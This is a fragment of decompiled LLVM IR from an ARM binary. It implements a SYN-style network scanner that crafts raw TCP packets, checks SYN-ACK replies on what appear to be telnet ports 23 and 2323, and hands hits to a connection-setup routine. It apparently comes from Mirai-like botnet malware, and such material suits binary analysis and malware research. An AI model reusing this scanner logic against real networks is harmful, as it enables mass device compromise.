  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_eac8, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_ea6c
  store i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_eaa4, i16* bitcast (i32* @global_var_218e2.193 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32 2) to i16*), align 2
  %v4_eae8 = load i32, i32* @global_var_218e8.194, align 4
  store i32 %v4_eae8, i32* @global_var_218f0.196, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_ea6c
  store i16 %v4_eaa4, i16* bitcast (i32* @global_var_218e2.193 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %r0.global-to-local, align 4
  %v4_eae854 = load i32, i32* @global_var_218e8.194, align 4
  store i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_eae854, i32* @global_var_218f0.196, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_218fc.197 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_218ec.154 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_eb14 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32 sext (i16 ptrtoint (i16* @global_var_218ec.154 to i16) to i32), i32 5120, i32 20)
  %v7_eb14 = trunc i32 %v6_eb14 to i16
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %r1.global-to-local, align 4
  %v2_eb20 = load i32, i32* @global_var_243f0.149, align 4
  store i16 %v7_eb14, i16* bitcast (i32* @global_var_218fc.197 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_eb4c = load i16, i16* @global_var_218ee.159, align 2
  %v4_eb4c = zext i16 %v3_eb4c to i32
  store i32 %v4_eb4c, i32* @lr, align 4
  store i32 %v2_f9c0, i32* %ip.global-to-local, align 4
  store i32 %v2_eb20, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eb68 = call i32 @__libc_sendto(i32 %v2_eb20, i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32 40, i32 16384, i32 %v2_e890, i32 16)
  store i32 %v7_eb68, i32* %r0.global-to-local, align 4
  %v3_eb6c = load i32, i32* %stack_var_-52, align 4
  %v1_eb70 = add i32 %v3_eb6c, 1
  store i32 %v1_eb70, i32* %r3.global-to-local, align 4
  %v3_eb74 = icmp ugt i32 %v1_eb70, 383
  store i1 %v3_eb74, i1* %cpsr_c.global-to-local, align 1
  %v8_eb74 = icmp eq i32 %v1_eb70, 384
  store i1 %v8_eb74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb70, i32* %stack_var_-52, align 4
  %v5_eb7c = icmp slt i32 %v1_eb70, 384
  br i1 %v5_eb7c, label %dec_label_pc_e894, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %bb407
  %v0_eb80 = load i32, i32* @r4, align 4
  br label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_e870, %dec_label_pc_eb80
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e870 ], [ %v0_eb80, %dec_label_pc_eb80 ]
  %v0_eb84 = call i32 @__GI___errno_location()
  store i32 %v0_eb84, i32* @fp, align 4
  store i32 %v2_e868, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_eb94, i32* @r4, align 4
  br label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_ec58, %dec_label_pc_ec50, %dec_label_pc_ec48, %dec_label_pc_ec24, %dec_label_pc_ec14, %dec_label_pc_ebf8, %dec_label_pc_ebe0, %dec_label_pc_ec40, %dec_label_pc_ec34, %dec_label_pc_ebd8, %dec_label_pc_ed10, %dec_label_pc_eb84
  %v1_eb9c = phi i32 [ %v0_eb84, %dec_label_pc_eb84 ], [ %v1_eb9c.pre.pre, %dec_label_pc_ed10 ], [ %v0_ebcc, %dec_label_pc_ebd8 ], [ %v0_ebcc, %dec_label_pc_ec34 ], [ %v0_ebcc, %dec_label_pc_ec40 ], [ %v0_ebcc, %dec_label_pc_ebe0 ], [ %v0_ebcc, %dec_label_pc_ebf8 ], [ %v0_ebcc, %dec_label_pc_ec14 ], [ %v0_ebcc, %dec_label_pc_ec24 ], [ %v0_ebcc, %dec_label_pc_ec48 ], [ %v0_ebcc, %dec_label_pc_ec50 ], [ %v0_ebcc, %dec_label_pc_ec58 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_eb9c = inttoptr i32 %v1_eb9c to i32*
  store i32 0, i32* %v2_eb9c, align 4
  %v2_eba8 = load i32, i32* @global_var_243f0.149, align 4
  store i32 %v2_eba8, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e868, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebb8 = load i32, i32* %ip.global-to-local, align 4
  %v6_ebc0 = call i32 @__libc_recvfrom(i32 %v2_eba8, i32 %v2_e868, i32 1514, i32 16384, i32 %v0_ebb8, i32 %v0_ebb8)
  store i32 %v6_ebc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebc4 = icmp eq i32 %v6_ebc0, 0
  store i1 %v2_ebc4, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_ebc0, 1
  br i1 %tmp408, label %dec_label_pc_ed20, label %dec_label_pc_ebcc

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_eb98
  %v0_ebcc = load i32, i32* @fp, align 4
  %v1_ebcc = inttoptr i32 %v0_ebcc to i32*
  %v2_ebcc = load i32, i32* %v1_ebcc, align 4
  store i32 %v2_ebcc, i32* %r3.global-to-local, align 4
  %v2_ebd0 = icmp ugt i32 %v2_ebcc, 10
  store i1 %v2_ebd0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebd0 = icmp eq i32 %v2_ebcc, 11
  store i1 %v7_ebd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebd0, label %dec_label_pc_ed20, label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebcc
  %v2_ebd8 = icmp ugt i32 %v6_ebc0, 38
  store i1 %v2_ebd8, i1* %cpsr_c.global-to-local, align 1
  %v7_ebd8 = icmp eq i32 %v6_ebc0, 39
  store i1 %v7_ebd8, i1* %cpsr_z.global-to-local, align 1
  %v2_ebdc = xor i1 %v2_ebd8, true
  %v3_ebdc = or i1 %v7_ebd8, %v2_ebdc
  br i1 %v3_ebdc, label %dec_label_pc_eb98, label %dec_label_pc_ebe0

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_ebd8
  store i32 %v2_e868, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32* %ip.global-to-local, align 4
  %v3_ebe8 = load i32, i32* %v2_ebe8, align 4
  store i32 %v3_ebe8, i32* %r2.global-to-local, align 4
  %v2_ebec = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_ebec, i32* %r3.global-to-local, align 4
  %v3_ebf0 = icmp uge i32 %v3_ebe8, %v2_ebec
  store i1 %v3_ebf0, i1* %cpsr_c.global-to-local, align 1
  %v9_ebf0 = icmp eq i32 %v3_ebe8, %v2_ebec
  store i1 %v9_ebf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebf0, label %dec_label_pc_ebf8, label %dec_label_pc_eb98

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebe0
  store i32 %v2_e868, i32* @lr, align 4
  %v3_ebfc = load i8, i8* %v2_ebfc, align 1
  %v4_ebfc = zext i8 %v3_ebfc to i32
  store i32 %v4_ebfc, i32* %r3.global-to-local, align 4
  %v2_ec00 = icmp ugt i8 %v3_ebfc, 5
  store i1 %v2_ec00, i1* %cpsr_c.global-to-local, align 1
  %v7_ec00 = icmp eq i8 %v3_ebfc, 6
  store i1 %v7_ec00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec00, label %dec_label_pc_ec08, label %dec_label_pc_eb98

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ebf8
  %v0_ec08 = load i32, i32* @r4, align 4
  %v1_ec08 = inttoptr i32 %v0_ec08 to i16*
  %v2_ec08 = load i16, i16* %v1_ec08, align 2
  %v3_ec08 = zext i16 %v2_ec08 to i32
  store i32 %v3_ec08, i32* %ip.global-to-local, align 4
  %v2_ec0c = icmp ugt i16 %v2_ec08, 5887
  store i1 %v2_ec0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec0c = icmp eq i16 %v2_ec08, 5888
  store i1 %v7_ec0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec0c, label %dec_label_pc_ec24, label %dec_label_pc_ec14

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ec08
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ec1c = icmp ugt i16 %v2_ec08, 4872
  store i1 %v3_ec1c, i1* %cpsr_c.global-to-local, align 1
  %v9_ec1c = icmp eq i16 %v2_ec08, 4873
  store i1 %v9_ec1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec1c, label %dec_label_pc_ec24, label %dec_label_pc_eb98

dec_label_pc_ec24:                                ; preds = %dec_label_pc_ec14, %dec_label_pc_ec08
  %v1_ec24 = add i32 %v0_ec08, 2
  %v2_ec24 = inttoptr i32 %v1_ec24 to i16*
  %v3_ec24 = load i16, i16* %v2_ec24, align 2
  %v4_ec24 = zext i16 %v3_ec24 to i32
  store i32 %v4_ec24, i32* %r3.global-to-local, align 4
  store i32 %v4_e738, i32* %r0.global-to-local, align 4
  %v3_ec2c = icmp uge i32 %v4_ec24, %v4_e738
  store i1 %v3_ec2c, i1* %cpsr_c.global-to-local, align 1
  %v9_ec2c = icmp eq i32 %v4_ec24, %v4_e738
  store i1 %v9_ec2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec2c, label %dec_label_pc_ec34, label %dec_label_pc_eb98

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec24
  %v1_ec34 = add i32 %v0_ec08, 13
  %v2_ec34 = inttoptr i32 %v1_ec34 to i8*
  %v3_ec34 = load i8, i8* %v2_ec34, align 1
  %v4_ec34 = zext i8 %v3_ec34 to i32
  store i32 %v4_ec34, i32* %r3.global-to-local, align 4
  %v1_ec38 = and i32 %v4_ec34, 2
  %v2_ec38 = icmp eq i32 %v1_ec38, 0
  store i1 %v2_ec38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec38, label %dec_label_pc_eb98, label %dec_label_pc_ec40

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ec34
  %v1_ec40 = and i32 %v4_ec34, 16
  %v2_ec40 = icmp eq i32 %v1_ec40, 0
  store i1 %v2_ec40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec40, label %dec_label_pc_eb98, label %dec_label_pc_ec48

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec40
  %v1_ec48 = and i32 %v4_ec34, 4
  %v2_ec48 = icmp eq i32 %v1_ec48, 0
  store i1 %v2_ec48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec48, label %dec_label_pc_ec50, label %dec_label_pc_eb98

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ec48
  %tmp = urem i8 %v3_ec34, 2
  %v2_ec50 = icmp eq i8 %tmp, 0
  store i1 %v2_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec50, label %dec_label_pc_ec58, label %dec_label_pc_eb98

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec50
  %v1_ec58 = add i32 %v0_ec08, 8
  %v2_ec58 = inttoptr i32 %v1_ec58 to i32*
  %v3_ec58 = load i32, i32* %v2_ec58, align 4
  %v5_ec70 = call i32 @llvm.bswap.i32(i32 %v3_ec58)
  %v1_ec74 = add i32 %v5_ec70, -1
  store i32 %v1_ec74, i32* %r2.global-to-local, align 4
  %v1_ec78 = and i32 %v1_ec74, 16711680
  store i32 %v1_ec78, i32* %r0.global-to-local, align 4
  %v3_ec7c = udiv i32 %v1_ec74, 16777216
  %v4_ec84 = udiv i32 %v1_ec78, 256
  %v5_ec84 = or i32 %v4_ec84, %v3_ec7c
  %v1_ec80 = mul i32 %v1_ec74, 256
  %v4_ec88 = and i32 %v1_ec80, 16711680
  %v5_ec88 = or i32 %v5_ec84, %v4_ec88
  store i32 %v5_ec88, i32* %r3.global-to-local, align 4
  store i32 %v2_e868, i32* %r1.global-to-local, align 4
  %v3_ec90 = load i32, i32* %v2_ec90, align 4
  store i32 %v3_ec90, i32* @lr, align 4
  %v5_ec94 = call i32 @llvm.bswap.i32(i32 %v1_ec74)
  store i32 %v5_ec94, i32* %r3.global-to-local, align 4
  %v3_ec98 = icmp uge i32 %v5_ec94, %v3_ec90
  store i1 %v3_ec98, i1* %cpsr_c.global-to-local, align 1
  %v9_ec98 = icmp eq i32 %v5_ec94, %v3_ec90
  store i1 %v9_ec98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec98, label %dec_label_pc_eca0, label %dec_label_pc_eb98

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec58
  %v0_eca0 = load i32, i32* @r5, align 4
  %v2_eca0 = icmp ugt i32 %v0_eca0, 254
  store i1 %v2_eca0, i1* %cpsr_c.global-to-local, align 1
  %v7_eca0 = icmp eq i32 %v0_eca0, 255
  store i1 %v7_eca0, i1* %cpsr_z.global-to-local, align 1
  %v8_eca4 = icmp sgt i32 %v0_eca0, 255
  br i1 %v8_eca4, label %dec_label_pc_ed20, label %dec_label_pc_eca8

dec_label_pc_eca8:                                ; preds = %dec_label_pc_eca0
  %v2_ecb0 = load i32, i32* @global_var_243ec.147, align 4
  store i32 %v2_ecb0, i32* %r1.global-to-local, align 4
  %v3_ecb4 = mul i32 %v0_eca0, 256
  store i32 %v3_ecb4, i32* %r2.global-to-local, align 4
  %v2_ecb8 = mul i32 %v0_eca0, 288
  store i32 %v2_ecb8, i32* %r3.global-to-local, align 4
  %v2_ecbc = add i32 %v2_ecb0, %v2_ecb8
  store i32 %v2_ecbc, i32* @r0, align 4
  %v1_ecc0 = add i32 %v2_ecbc, 12
  %v2_ecc0 = inttoptr i32 %v1_ecc0 to i32*
  %v3_ecc0 = load i32, i32* %v2_ecc0, align 4
  store i32 %v3_ecc0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecc4 = icmp eq i32 %v3_ecc0, 0
  store i1 %v2_ecc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ecc4, label %dec_label_pc_ed08, label %dec_label_pc_ece4.preheader

dec_label_pc_ece4.preheader:                      ; preds = %dec_label_pc_eca8
  %v2_ecc8 = add i32 %v0_eca0, 1
  %v2_ecd0 = and i32 %v2_ecc8, 134217728
  %v3_ecd0 = icmp ne i32 %v2_ecd0, 0
  store i1 %v3_ecd0, i1* %cpsr_c.global-to-local, align 1
  %v3_ecd4 = mul i32 %v2_ecc8, 288
  %v3_ecd8 = add i32 %v2_ecb0, %v3_ecd4
  store i32 %v3_ecd8, i32* %r3.global-to-local, align 4
  store i32 %v0_eca0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ece4

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ece4.preheader, %dec_label_pc_ecf0
  %v0_ecf0 = phi i32 [ %v3_ecd8, %dec_label_pc_ece4.preheader ], [ %v1_ecfc, %dec_label_pc_ecf0 ]
  %v0_ece4 = phi i32 [ %v0_eca0, %dec_label_pc_ece4.preheader ], [ %v1_ece4, %dec_label_pc_ecf0 ]
  %v1_ece4 = add i32 %v0_ece4, 1
  store i32 %v1_ece4, i32* %r2.global-to-local, align 4
  %v7_ece8 = icmp eq i32 %v1_ece4, 256
  br i1 %v7_ece8, label %dec_label_pc_ed20.loopexit, label %dec_label_pc_ecf0

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_ece4
  store i32 %v0_ecf0, i32* @r0, align 4
  %v1_ecf4 = add i32 %v0_ecf0, 12
  %v2_ecf4 = inttoptr i32 %v1_ecf4 to i32*
  %v3_ecf4 = load i32, i32* %v2_ecf4, align 4
  %v2_ecf8 = icmp eq i32 %v3_ecf4, 0
  %v1_ecfc = add i32 %v0_ecf0, 288
  store i32 %v1_ecfc, i32* %r3.global-to-local, align 4
  br i1 %v2_ecf8, label %dec_label_pc_ed04, label %dec_label_pc_ece4

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ecf0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ece4, i32* @r5, align 4
  br label %dec_label_pc_ed08

dec_label_pc_ed08:                                ; preds = %dec_label_pc_eca8, %dec_label_pc_ed04
  %v1_ed10 = phi i32 [ %v2_ecbc, %dec_label_pc_eca8 ], [ %v0_ecf0, %dec_label_pc_ed04 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed08 = icmp eq i32 %v1_ed10, 0
  store i1 %v2_ed08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed08, label %dec_label_pc_ed20, label %dec_label_pc_ed10

dec_label_pc_ed10:                                ; preds = %dec_label_pc_ed08
  %v2_ed10 = add i32 %v1_ed10, 16
  %v3_ed10 = inttoptr i32 %v2_ed10 to i32*
  store i32 %v3_ec90, i32* %v3_ed10, align 4
  %v0_ed14 = load i32, i32* %ip.global-to-local, align 4
  %v1_ed14 = trunc i32 %v0_ed14 to i16
  %v2_ed14 = load i32, i32* @r0, align 4
  %v3_ed14 = add i32 %v2_ed14, 20
  %v4_ed14 = inttoptr i32 %v3_ed14 to i16*
  store i16 %v1_ed14, i16* %v4_ed14, align 2
  %v0_ed18 = call i32 @setup_connection()
  store i32 %v0_ed18, i32* %r0.global-to-local, align 4
  %v1_eb9c.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_eb98

dec_label_pc_ed20.loopexit:                       ; preds = %dec_label_pc_ece4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed20

dec_label_pc_ed20:                                ; preds = %dec_label_pc_ed08, %dec_label_pc_eca0, %dec_label_pc_ebcc, %dec_label_pc_eb98, %dec_label_pc_ed20.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_ed40513 = load i32, i32* @sp, align 4
  %v3_ed40514 = add i32 %v2_ed40513, 1676
  %v4_ed40515 = inttoptr i32 %v3_ed40514 to i32*
  store i32 0, i32* %v4_ed40515, align 4
  br label %dec_label_pc_ed2c.dec_label_pc_ed2c_crit_edge

dec_label_pc_ed2c.dec_label_pc_ed2c_crit_edge:    ; preds = %dec_label_pc_ed20, %dec_label_pc_ed2c.dec_label_pc_ed2c_crit_edge
  %v0_ed2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ed30 = add i32 %v0_ed2c.pre, 4
  store i32 %v1_ed30, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ed38 = add i32 %v0_ed2c.pre, 1672
  store i32 %v1_ed38, i32* %ip.global-to-local, align 4
  %v7_ed3c = icmp eq i32 %v1_ed30, 128
  %v2_ed40 = load i32, i32* @sp, align 4
  %v3_ed40 = add i32 %v2_ed40, %v1_ed38
  %v4_ed40 = inttoptr i32 %v3_ed40 to i32*
  store i32 0, i32* %v4_ed40, align 4
  br i1 %v7_ed3c, label %dec_label_pc_ed48, label %dec_label_pc_ed2c.dec_label_pc_ed2c_crit_edge

dec_label_pc_ed48:                                ; preds = %dec_label_pc_ed2c.dec_label_pc_ed2c_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed48 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ed48, i32* %stack_var_-352, align 4
  %v1_ed54516 = add i32 %v0_ed48, 8
  store i32 %v1_ed54516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed5c517 = add i32 %v0_ed48, 1548
  store i32 %v1_ed5c517, i32* @lr, align 4
  %v7_ed60518 = icmp eq i32 %v1_ed54516, 128
  %v2_ed64519 = load i32, i32* @sp, align 4
  %v3_ed64520 = add i32 %v2_ed64519, %v1_ed5c517
  %v4_ed64521 = inttoptr i32 %v3_ed64520 to i32*
  store i32 0, i32* %v4_ed64521, align 4
  br i1 %v7_ed60518, label %dec_label_pc_ed6c, label %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge

dec_label_pc_ed50.dec_label_pc_ed50_crit_edge:    ; preds = %dec_label_pc_ed48, %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge
  %v0_ed50.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ed54 = add i32 %v0_ed50.pre, 4
  store i32 %v1_ed54, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed5c = add i32 %v0_ed50.pre, 1544
  store i32 %v1_ed5c, i32* @lr, align 4
  %v7_ed60 = icmp eq i32 %v1_ed54, 128
  %v2_ed64 = load i32, i32* @sp, align 4
  %v3_ed64 = add i32 %v2_ed64, %v1_ed5c
  %v4_ed64 = inttoptr i32 %v3_ed64 to i32*
  store i32 0, i32* %v4_ed64, align 4
  br i1 %v7_ed60, label %dec_label_pc_ed6c, label %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge, %dec_label_pc_ed48
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ed6c, i32* @r6, align 4
  store i32 %v0_ed6c, i32* @r5, align 4
  store i32 %v0_ed6c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_edc8

dec_label_pc_ed7c:                                ; preds = %dec_label_pc_edf8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ede4, i1* %cpsr_z.global-to-local, align 1
  %v1_ee68 = add i32 %v2_eddc, 4
  %v2_ee68 = inttoptr i32 %v1_ee68 to i32*
  %v3_ee68 = load i32, i32* %v2_ee68, align 4
  br i1 %v7_ede4, label %dec_label_pc_ee68, label %dec_label_pc_ed84

dec_label_pc_ed84:                                ; preds = %dec_label_pc_ed7c
  store i32 %v3_ee68, i32* %ip.global-to-local, align 4
  %v3_ed88 = udiv i32 %v3_ee68, 32
  store i32 %v2_ee74, i32* %r0.global-to-local, align 4
  %v3_ed90 = mul nuw nsw i32 %v3_ed88, 4
  %v2_ed94 = add i32 %v3_ed90, %v2_ee74
  store i32 %v2_ed94, i32* %r3.global-to-local, align 4
  %v1_ed98 = add i32 %v2_ed94, -184
  %v2_ed98 = inttoptr i32 %v1_ed98 to i32*
  %v3_ed98 = load i32, i32* %v2_ed98, align 4
  %v1_ed9c = urem i32 %v3_ee68, 32
  store i32 %v1_ed9c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_eda4 = shl i32 1, %v1_ed9c
  %v8_eda4 = or i32 %v3_ed98, %v7_eda4
  store i32 %v8_eda4, i32* %r2.global-to-local, align 4
  store i32 %v8_eda4, i32* %v2_ed98, align 4
  %v0_edac = load i32, i32* @r6, align 4
  %v1_edac = load i32, i32* %ip.global-to-local, align 4
  %v3_edac = icmp uge i32 %v0_edac, %v1_edac
  store i1 %v3_edac, i1* %cpsr_c.global-to-local, align 1
  %v9_edac = icmp eq i32 %v0_edac, %v1_edac
  store i1 %v9_edac, i1* %cpsr_z.global-to-local, align 1
  %v5_edb0 = icmp slt i32 %v0_edac, %v1_edac
  br i1 %v5_edb0, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_ed84
  store i32 %v1_edac, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ee5c, %dec_label_pc_ed84, %bb409
  %v3_edb4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_edb4, i32* %r3.global-to-local, align 4
  %v1_edb8 = add i32 %v3_edb4, 1
  store i32 %v1_edb8, i32* %r2.global-to-local, align 4
  %v2_edbc = icmp ugt i32 %v1_edb8, 254
  store i1 %v2_edbc, i1* %cpsr_c.global-to-local, align 1
  %v7_edbc = icmp eq i32 %v1_edb8, 255
  store i1 %v7_edbc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_edb8, i32* %stack_var_-52, align 4
  %v8_edc4 = icmp sgt i32 %v1_edb8, 255
  br i1 %v8_edc4, label %dec_label_pc_ee98, label %dec_label_pc_edc8

dec_label_pc_edc8:                                ; preds = %bb410, %dec_label_pc_ed6c
  %v0_edd4 = phi i32 [ %v1_edb8, %bb410 ], [ %v0_ed6c, %dec_label_pc_ed6c ]
  store i32 ptrtoint (i32* @global_var_243ec.147 to i32), i32* %r0.global-to-local, align 4
  %v3_edcc = mul i32 %v0_edd4, 256
  store i32 %v3_edcc, i32* %r3.global-to-local, align 4
  %v2_edd0 = load i32, i32* @global_var_243ec.147, align 4
  store i32 %v2_edd0, i32* @r1, align 4
  %v2_edd8 = mul i32 %v0_edd4, 288
  store i32 %v2_edd8, i32* %r2.global-to-local, align 4
  %v2_eddc = add i32 %v2_edd0, %v2_edd8
  store i32 %v2_eddc, i32* @r4, align 4
  %v1_ede0 = add i32 %v2_eddc, 12
  %v2_ede0 = inttoptr i32 %v1_ede0 to i32*
  %v3_ede0 = load i32, i32* %v2_ede0, align 4
  store i32 %v3_ede0, i32* %ip.global-to-local, align 4
  %v2_ede4 = icmp ne i32 %v3_ede0, 0
  store i1 %v2_ede4, i1* %cpsr_c.global-to-local, align 1
  %v7_ede4 = icmp eq i32 %v3_ede0, 1
  store i1 %v7_ede4, i1* %cpsr_z.global-to-local, align 1
  %v2_ede8 = xor i1 %v2_ede4, true
  %v3_ede8 = or i1 %v7_ede4, %v2_ede8
  br i1 %v3_ede8, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_edc8
  store i32 5, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_edc8, %bb411
  %v1_ee08215 = phi i32 [ %v2_edd0, %dec_label_pc_edc8 ], [ 5, %bb411 ]
  %v2_edec = xor i1 %v7_ede4, true
  %v3_edec = and i1 %v2_ede4, %v2_edec
  br i1 %v3_edec, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* @r1, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_ee08 = phi i32 [ %v1_ee08215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edf0 = icmp eq i32 %v3_ede0, 0
  store i1 %v2_edf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edf0, label %bb410, label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_21908.135 to i32), i32* %r2.global-to-local, align 4
  %v2_edfc = load i32, i32* @global_var_21908.135, align 4
  store i32 %v2_edfc, i32* %r3.global-to-local, align 4
  %v1_ee00 = add i32 %v2_eddc, 8
  %v2_ee00 = inttoptr i32 %v1_ee00 to i32*
  %v3_ee00 = load i32, i32* %v2_ee00, align 4
  store i32 %v3_ee00, i32* %r2.global-to-local, align 4
  %v2_ee04 = sub i32 %v2_edfc, %v3_ee00
  store i32 %v2_ee04, i32* %r3.global-to-local, align 4
  %v3_ee08 = icmp uge i32 %v2_ee04, %v1_ee08
  store i1 %v3_ee08, i1* %cpsr_c.global-to-local, align 1
  %v9_ee08 = icmp eq i32 %v2_ee04, %v1_ee08
  store i1 %v9_ee08, i1* %cpsr_z.global-to-local, align 1
  %v2_ee0c = xor i1 %v3_ee08, true
  %v3_ee0c = or i1 %v9_ee08, %v2_ee0c
  br i1 %v3_ee0c, label %dec_label_pc_ed7c, label %dec_label_pc_ee10

dec_label_pc_ee10:                                ; preds = %dec_label_pc_edf8
  %v1_ee10 = add i32 %v2_eddc, 4
  %v2_ee10 = inttoptr i32 %v1_ee10 to i32*
  %v3_ee10 = load i32, i32* %v2_ee10, align 4
  store i32 %v3_ee10, i32* %r0.global-to-local, align 4
  %v1_ee14 = call i32 @__GI___libc_close(i32 %v3_ee10)
  store i32 %v1_ee14, i32* %r0.global-to-local, align 4
  %v0_ee18 = load i32, i32* @r4, align 4
  %v1_ee18 = add i32 %v0_ee18, 12
  %v2_ee18 = inttoptr i32 %v1_ee18 to i32*
  %v3_ee18 = load i32, i32* %v2_ee18, align 4
